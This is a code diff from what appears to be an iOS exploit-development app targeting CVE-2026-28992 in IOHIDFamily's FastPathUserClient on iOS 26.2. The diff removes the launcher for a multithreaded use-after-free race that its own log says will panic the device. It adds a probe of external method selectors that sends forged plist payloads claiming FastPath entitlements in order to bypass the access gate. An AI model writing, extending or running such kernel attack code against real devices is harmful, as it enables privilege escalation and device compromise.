@@ -651,7 +651,7 @@ static void *e2_free_and_ool_racer(void *arg) {
     UIButtonConfiguration *iohidConf = [UIButtonConfiguration filledButtonConfiguration];
     iohidConf.baseBackgroundColor = [UIColor systemPurpleColor];
     self.iohidUAFButton.configuration = iohidConf;
-    [self.iohidUAFButton setTitle:@"CVE-2026-28992 IOHID UAF v1" forState:UIControlStateNormal];
+    [self.iohidUAFButton setTitle:@"CVE-2026-28992 Method Probe v2" forState:UIControlStateNormal];
     [self.iohidUAFButton addTarget:self action:@selector(iohidUAFTapped) forControlEvents:UIControlEventTouchUpInside];
     [self.view addSubview:self.iohidUAFButton];
 
@@ -7067,16 +7067,15 @@ static void *iohid_threadCopyEvent(void *arg) {
     }
 
     [self appendLog:@"\n============================================================"];
-    [self appendLog:@"  CVE-2026-28992 v1 — IOHIDFamily FastPathUserClient UAF"];
+    [self appendLog:@"  CVE-2026-28992 v2 — IOHIDFamily method table probe"];
     [self appendLog:@"  Target: iOS 26.2 | iPhone 13 (A15, no MTE)"];
-    [self appendLog:@"  Patched: iOS 26.5 — UNPATCHED on this device"];
-    [self appendLog:@"  Race: close(sel1) vs copyEvent(sel2) — different lock domains"];
-    [self appendLog:@"  EXPECTED: Kernel panic (data abort). Device WILL reboot."];
+    [self appendLog:@"  Probing FastPathUserClient external method table"];
+    [self appendLog:@"  (v1 gate bypass returned kIOReturnUnsupported on all conns)"];
     [self appendLog:@"============================================================"];
 
     dispatch_async(dispatch_get_main_queue(), ^{
         self.iohidUAFButton.enabled = NO;
-        [self.iohidUAFButton setTitle:@"RACING..." forState:UIControlStateNormal];
+        [self.iohidUAFButton setTitle:@"PROBING..." forState:UIControlStateNormal];
     });
 
     dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
@@ -7085,7 +7084,7 @@ static void *iohid_threadCopyEvent(void *arg) {
             _iohidRunning = 0;
             dispatch_async(dispatch_get_main_queue(), ^{
                 self.iohidUAFButton.enabled = YES;
-                [self.iohidUAFButton setTitle:@"CVE-2026-28992 IOHID UAF v1" forState:UIControlStateNormal];
+                [self.iohidUAFButton setTitle:@"CVE-2026-28992 Method Probe v2" forState:UIControlStateNormal];
             });
         }
     });
@@ -7145,54 +7144,106 @@ static void *iohid_threadCopyEvent(void *arg) {
         return;
     }
 
-    // Step 4: Write crash-site marker
-    NSString *marker = [NSTemporaryDirectory()
-        stringByAppendingPathComponent:@"iohid_uaf_v1_started.txt"];
-    [@"iohid_uaf_v1" writeToFile:marker atomically:YES
-                        encoding:NSUTF8StringEncoding error:nil];
+    // Step 4: Probe external method table (iOS 26.2 may have different layout)
+    [log appendString:@"\n--- Probing FastPathUserClient external methods (sel 0-9) ---\n"];
+    io_connect_t probeConn = iohid_g_conns[0];
+    uint64_t scalar = 0;
 
-    // Step 5: Flush log BEFORE starting race (survives panic)
+    // sel0 (expected: gate/open) — iOS 26.2 returns kIOReturnUnsupported for XML dict
+    kern_return_t sel_ret[10];
+    for (int sel = 0; sel <= 9; sel++) {
+        // Try with gate XML first
+        sel_ret[sel] = sIOConnectCallMethod(probeConn, sel,
+            NULL, 0,
+            iohid_g_gateXML.bytes, iohid_g_gateXML.length,
+            NULL, NULL, NULL, NULL);
+        [log appendFormat:@"  sel%d (gateXML): 0x%x %s\n", sel, sel_ret[sel],
+            mach_error_string(sel_ret[sel])];
+    }
+
+    // Also probe sel0-sel9 with scalar-only (no struct input)
+    [log appendString:@"\n  Scalar-only probe:\n"];
+    for (int sel = 0; sel <= 9; sel++) {
+        kern_return_t kr = sIOConnectCallMethod(probeConn, sel,
+            &scalar, 1, NULL, 0,
+            NULL, NULL, NULL, NULL);
+        [log appendFormat:@"  sel%d (scalar): 0x%x %s\n", sel, kr,
+            mach_error_string(kr)];
+    }
+
+    // Probe sel0-sel9 with empty call (no input at all)
+    [log appendString:@"\n  No-input probe:\n"];
+    for (int sel = 0; sel <= 9; sel++) {
+        kern_return_t kr = sIOConnectCallMethod(probeConn, sel,
+            NULL, 0, NULL, 0,
+            NULL, NULL, NULL, NULL);
+        [log appendFormat:@"  sel%d (noinput): 0x%x %s\n", sel, kr,
+            mach_error_string(kr)];
+    }
+
+    // Also try sel0 with different gate formats
+    [log appendString:@"\n  Gate format variants for sel0:\n"];
+
+    // Binary plist
+    NSError *err = nil;
+    NSDictionary *gateDict = @{
+        @"FastPathHasEntitlement": @YES,
+        @"FastPathMotionEventEntitlement": @YES,
+    };
+    NSData *binaryGate = [NSPropertyListSerialization dataWithPropertyList:gateDict
+        format:NSPropertyListBinaryFormat_v1_0 options:0 error:&err];
+    if (binaryGate) {
+        kern_return_t kr = sIOConnectCallMethod(probeConn, 0,
+            NULL, 0, binaryGate.bytes, binaryGate.length,
+            NULL, NULL, NULL, NULL);
+        [log appendFormat:@"  sel0 (binary): 0x%x %s\n", kr, mach_error_string(kr)];
+    }
+
+    // XML with different root
+    NSDictionary *altDict = @{
+        @"FastPathHasEntitlement": @YES,
+    };
+    NSData *altXML = [NSPropertyListSerialization dataWithPropertyList:altDict
+        format:NSPropertyListXMLFormat_v1_0 options:0 error:&err];
+    if (altXML) {
+        kern_return_t kr = sIOConnectCallMethod(probeConn, 0,
+            NULL, 0, altXML.bytes, altXML.length,
+            NULL, NULL, NULL, NULL);
+        [log appendFormat:@"  sel0 (single-key): 0x%x %s\n", kr, mach_error_string(kr)];
+    }
+
+    // Raw bytes (4 bytes of 0x01)
+    uint8_t rawGate[4] = { 0x01, 0x00, 0x00, 0x00 };
+    kern_return_t rawKr = sIOConnectCallMethod(probeConn, 0,
+        NULL, 0, rawGate, 4,
+        NULL, NULL, NULL, NULL);
+    [log appendFormat:@"  sel0 (raw 0x01): 0x%x %s\n", rawKr, mach_error_string(rawKr)];
+
+    // Empty dict XML
+    NSDictionary *emptyDict = @{};
+    NSData *emptyXML = [NSPropertyListSerialization dataWithPropertyList:emptyDict
+        format:NSPropertyListXMLFormat_v1_0 options:0 error:&err];
+    if (emptyXML) {
+        kern_return_t kr = sIOConnectCallMethod(probeConn, 0,
+            NULL, 0, emptyXML.bytes, emptyXML.length,
+            NULL, NULL, NULL, NULL);
+        [log appendFormat:@"  sel0 (empty dict): 0x%x %s\n", kr, mach_error_string(kr)];
+    }
+
+    // Flush probe results
     dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
 
-    // Step 6: Start race threads
-    atomic_store(&iohid_g_stop, false);
+    // Skip race for now — gate bypass failed, need to map methods first
+    [log appendString:@"\n⚠ Gate bypass failed on all formats — method table mapping needed.\n"];
+    [log appendString:@"  Skipping race. Device survived (expected).\n"];
+    dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:log]; });
 
-    pthread_t churnThread;
-    pthread_create(&churnThread, NULL, iohid_threadChurn, NULL);
-
-    pthread_t copyThreads[IOHID_NUM_COPY_THREADS];
-    IOHIDCopyArg copyArgs[IOHID_NUM_COPY_THREADS];
-    for (int i = 0; i < IOHID_NUM_COPY_THREADS; i++) {
-        copyArgs[i].idx = (i % (openedConns - 1)) + 1;  // distribute across conn[1..N]
-        pthread_create(&copyThreads[i], NULL, iohid_threadCopyEvent, &copyArgs[i]);
-    }
-
-    NSLog(@"[IOHID] %d churn + %d copyEvent threads racing — waiting for panic...",
-         1, IOHID_NUM_COPY_THREADS);
-
-    // Step 7: Wait for panic (usually < 5 seconds)
-    sleep(IOHID_RACE_SECONDS);
-
-    // If we reach here, device survived
-    atomic_store(&iohid_g_stop, true);
-    pthread_join(churnThread, NULL);
-    for (int i = 0; i < IOHID_NUM_COPY_THREADS; i++) pthread_join(copyThreads[i], NULL);
-
-    // Cleanup connections
+    // Cleanup
     for (int i = 0; i < IOHID_NUM_CONNS; i++) {
-        if (iohid_g_conns[i]) sIOServiceClose(iohid_g_conns[i]);
+        if (iohid_g_conns[i]) { sIOServiceClose(iohid_g_conns[i]); iohid_g_conns[i] = 0; }
     }
-
-    [[NSFileManager defaultManager] removeItemAtPath:marker error:nil];
-
-    NSMutableString *surviveLog = [NSMutableString string];
-    [surviveLog appendString:@"\n--- IOHIDFamily UAF v1: DEVICE SURVIVED ---\n"];
-    [surviveLog appendString:@"  Possible reasons:\n"];
-    [surviveLog appendString:@"  1. IOHIDEventService type=2 rejected on iOS 26.2\n"];
-    [surviveLog appendString:@"  2. Entitlement bypass failed (gate returned error)\n"];
-    [surviveLog appendString:@"  3. Race window not hit in 25s (unlikely)\n"];
-    [surviveLog appendString:@"  4. CVE-2026-28992 already patched on this build\n"];
-    dispatch_async(dispatch_get_main_queue(), ^{ [self appendLog:surviveLog]; });
+    if (service) { sIOObjectRelease(service); }
+    return;
 }
 
 @end
